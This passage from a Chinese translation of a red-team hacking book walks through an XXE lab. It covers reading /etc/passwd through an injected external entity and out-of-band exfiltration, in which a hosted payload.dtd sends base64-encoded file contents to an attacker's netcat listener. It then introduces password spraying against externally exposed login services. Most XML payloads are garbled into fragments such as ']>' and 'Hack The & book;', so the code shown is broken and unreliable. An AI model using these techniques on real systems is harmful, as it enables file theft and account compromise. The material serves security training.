声明(DTD)内，3) XML处理器必须验证/处理 DTD 并解析外部实体。
上面，我们有一个普通的 XML 文件和一个专门用来从系统的 /etc/passwd  文件中读取文件的恶意 XML。我们将看
看是否可以在真实的 XML 请求中注入恶意 XML 请求。
XXE 实验：
由于自定义配置请求，有一个不同的 VMWare 虚拟机用于 XXE 攻击。这可以在这里找到：
http://thehackerplaybook.com/get.php?type=XXE-vm
下载后，在 VMWare 中打开虚拟机并启动它。在登录屏幕上，你无需登录，但你应该看到系统的 IP 地址。
转到浏览器：
通过 Burp Suite 代理所有流量
转到 URL：http://[IP of your Virtual Machine]
拦截流量并点击 Hack the XML
如果在加载页面后查看页面的 HTML 源代码，你可以看到有一个通过 POST 请求提交的隐藏字段。XML 内容如下所
示：
在这个例子中，我们指定它是 XML 1.0版本，DOCTYPE，指定根元素是 thp， !ELEMENT  指定任何类型，并且
!ENTITY  将 book 变量设置为“Universe”字符串。最后，在我们的 XML 输出中，我们希望从解析 XML 文件中打印
出我们的实体。
这通常是你在发送 XML 数据的应用程序中看到的内容。由于我们控制具有 XML 请求的 POST 数据，因此我们可以尝
试注入我们自己的恶意实体。默认情况下，大多数 XML 解析库都支持 SYSTEM 关键字，该关键字允许从 URI 读取数
据(包括使用 file://  协议 )。因此，我们可以创建自己的实体来制作在 /etc/passwd  上读取的文件。
]>
 Hack The &book;
原始 XML 文件
恶意 XML 文件
]>
]>
Hack The & book;
Hack The &book;
XXE 实验——阅读文件：
拦截 [你的 VM 的 IP]/xxe.php 的流量包并点击 Hack of XML
将截获的流量包发送到 Repeater
将“data”的 POST 参数修改为以下内容：
]>Hack The %26book%3B
请注意， %26  等同于 & ， %3B 等同于 ; 。我们需要对&符号和分号字符进行百分比编码。
发送流量包，我们现在应该能够读取 /etc/passwd
高级 XXE——XXE-OOB
在之前的攻击中，我们能够在  标签中获得返回的响应。那么如果我们看不到响应或遇到字符或文件限制怎么
办？我们怎样使用带外数据协议（OOB）来发送我们的数据？我们可以提供远程文档类型定义（DTD）文件来执行
OOB-XXE，而不是在请求 payload 中定义我们的攻击。DTD 是结构良好的 XML 文件，用于定义 XML 文档的结构和
法律元素及属性。为了简单起见，我们的 DTD 将包含我们所有的攻击或 exﬁl payload，这将帮助我们解决许多字符
的限制。在我们的实验示例中，我们将使有 XXE 漏洞的服务器请求一个托管在远程服务器上的 DTD。
新的 XXE 攻击将分四个阶段进行：
1. 使用篡改后的 XXE XML 攻击
2. 对于存在漏洞的 XML 解析器，它会从攻击者服务器抓取一个 DTD 文件
3. 该 DTD 文件包含读取 /etc/passwd 文件的代码
4. 该 DTD文件也包含用于隐秘传输 /etc/passwd 内容的代码（可能是经过编码的）
设置我们的攻击者机器和 XXE-OOB payload：
我们将指定一个外部 DTD 文件，而不是原始文件读取
 %dtd; 
新的“数据”POST payload 将如下所示（记得更改 [Your_IP]）：
 %dtd;]>%26send%3B 
我们需要通过创建名为 payload.dtd 的文件在攻击者服务器上托管此 payload
gedit /var/www/html/payload.dtd
"> 
%all; 
你刚刚创建的 DTD 文件指示易受攻击的服务器读取 /etc/ passwd  然后尝试使用我们的敏感数据向我们的攻
击者机器发出 Web 请求。为了确保我们收到响应，我们需要启动 Web 服务器来托管 DTD 文件并设置 NetCat
监听器
nc -l -p 8888
你将遇到“检测到实体引用循环”类型的错误,具体的报错内容大概是：“Detected an entity reference loop in
/var/www/html/xxe.php on line 20"。在进行 XXE 攻击时，通常会遇到解析器错误。很多时候，XXE
解析器仅仅允许某些字符，因此读取带有特殊字符的文件会报错。我们可以做些什么来解决这个问题？在使用
PHP 的情况下，我们可以使用 PHP 输入和输出流（ http://php.net/manual/en/wrappers.php.php ）来读取
本地文件，并使用 php://filter/read=convert.base64-encode  对它们进行 base64 编码。让我们重启我们
的 NetCat 监听器并更改我们的 payload.dtd 文件以使用此功能：
"> 
%all; 
一旦我们重放我们新修改的请求，我们现在就可以看到我们的受害者服务器首先获取并运行了 payload.dtd 文件，然
后监听8888端口的 NetCat 处理程序发出二次 Web 请求。当然，GET 请求将采用 base64编码并且我们也将必须对
请求进行解码。
更多 XXE payload：
https://gist.github.com/staaldraad/01415b990939494879b4
https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/XXE-Fuzzing.txt
本章总结
虽然这只是你可能遇到的所有不同网络攻击的一小部分，但我希望这些案例能打开你的视野，关于更现代的框架
（Node.js）是如何引入旧的和新的攻击。许多常见的应用程序漏洞扫描器往往会错过很多这些更复杂的漏洞，因为
它们是基于特定的语言或框架的。我想提出的要点是，为了进行充分的攻击活动，你需要真正理解语言和框架。
第4章 带球——开始攻击网络
译者：@Snowming
校对者：@鸫、@leitbogioro、@哈姆太郎、@匿名jack
在进行风险评估项目的第二天，你使用 nmap 扫描了目标的全部网段，还启动了漏洞扫描器，但运气不太好，你没
有探测出任何 Web 应用程序的初始入口点。这让你感到有些失败，需要反思一下，重新回顾一下之前收集到的所有
信息。因为你知道，一旦可以进入目标网络，就可以使用无数的技巧来获得更多的凭证、在域中漫游、利用 AD（活
动目录）的特性，最后找到我们要找的东西。当然，这不是一件容易的事。因为你要绕过众多防火墙，还要欺骗管理
员，最后还要擦除自己的痕迹。
在上一本书中，本部分着重于使用漏洞扫描器来发现漏洞并利用它们。这是通过使用诸如 Metasploit、打印机漏
洞、心脏滴血、Shellshock、SQL 注入等常见漏洞的利用工具来实现的。最近一段时间，爆出了很多严重的远程代码
执行漏洞，比如 永恒之蓝（MS017-10）、多个版本的 Jenkins 漏洞、Apache Struts 2、CMS 应用的代码执行漏洞
等等。因为本书是以红队的视角来阐述的，因此我们不会过多地关注如何使用这些工具来攻击利用特定的漏洞。相
反，我们将关注如何利用公司现有的应用程序，就地取材来发现漏洞，然后攻破公司网络。
在本章中，将集中讨论红队的战术，如何利用公司基础设施、获取身份凭证、探索内部网络以及在主机和网络之间进
行漫游。我们将在不运行任何一个漏洞扫描器的前提下完成这项工作。
从外网寻找侵入对方系统的登陆凭证
作为一个红队成员，找到最初的攻击点可能很麻烦，需要耗费大量的资源。在上本书中，我们尝试过伪造受害者的身
份验证页面、购买非常相似的域名来对目标实施钓鱼，以及编写自定义的恶意软件等不同的方法。
有时候，我告诉我的红队队员要保持简单的思想。很多时候，那些令人称赞的高级手段，反而不如一些简单低级的方
法管用，最简单的方法往往是最有效的。
最基本的技术之一就是暴力破解密码。但是，作为红队的一员，我们必须考虑如何巧妙地做到这一点。随着公司的发
展，公司使用了更多的应用程序和技术工具。对于攻击者来说，这无疑为他们拓宽了进攻的大门。当公司开始暴露在
互联网上时，我们看到公司需要对电子邮件（如 Oﬃce 365或 OWA）、通信工具（如 Lync、XMPP、WebEx）、协
作工具（如 JIRA、Slack、Hipchat、Huddle）和其他外部服务（如 Jenkins、CMS 站点、支持站点）进行身份验
证。这些就是我们的目标突破口。
我们试图攻击这些服务器和服务的原因是，我们需要寻找能对受害者的 LDAP 或 AD 这些基础设施进行身份验证的工
具。这可以通过 ADFS 方式、单点登录（SSO）方式或者直接使用 AD 域认证等不同的方式来完成。我们需要找到一
些可以利用的公共凭证，以便继续进行下一步的攻击。在信息收集阶段，我们发现并识别了大量的电子邮箱地址和用
户名帐号，我们将对这些获取到的信息进行一种叫“密码喷洒”（Password Spraying）的攻击。我们将针对所有不同
的应用程序，尝试猜测基本密码，正如我们在现实世界的 APT 活动中看到的那样（ US-CERT 文章：http://bit.ly/2qy
B9rb ）。
译者注：“密码喷洒攻击”（Password Spray Attack）并不等同于“密码爆破攻击”（Brute Force Attack）。事实
上，这两种攻击是相反的。 
在密码爆破攻击中，黑客选择一个易受攻击的 ID 并一个接一个地输入密码，希望有一些密码可以让他们进入。
基本上，密码爆破是用多个密码尝试破解同一个 ID。而密码喷洒攻击，是用一个密码来尝试多个用户 ID，以便
至少有一个用户 ID 被泄露。对于密码喷洒攻击，黑客使用社交工程或其他网络钓鱼方法收集多个用户 ID。通
常情况下，至少有一个用户使用简单的密码，如12345678甚至是 p@ssw0rd。 
在密码喷洒攻击中，黑客会为他或她收集的所有用户 ID 应用精心构造的密码。因此，密码喷洒攻击可以定义为
将相同的密码应用于组织中的多个用户帐户，目的是安全的对其中一个帐户进行未授权访问。 
暴力破解的问题在于，在使用不同密码进行一定次数的尝试后，系统可能会被锁定。为了避免这种情况，产生
了收集用户 ID 并将可能的密码应用于它们的想法。使用密码喷洒攻击时，黑客也会采取一些预防措施。例如，
如果他们尝试将 password1应用于所有用户帐户，则在完成第一轮后，他们不会立即开始将 password2应用
于这些帐户。他们将在黑客攻击中留出至少30分钟的时间。 
参考资料：Password Spray Attack Deﬁnition and Defending yourself
那么，为什么要针对不同的外部服务进行身份验证呢？这是因为：
有些身份验证程序不会记录从外部服务尝试验证的次数。
虽然我们通常看到电子邮件或 VPN 系统要求双因素验证（2FA），但面向外部的即时通讯系统可能不需要。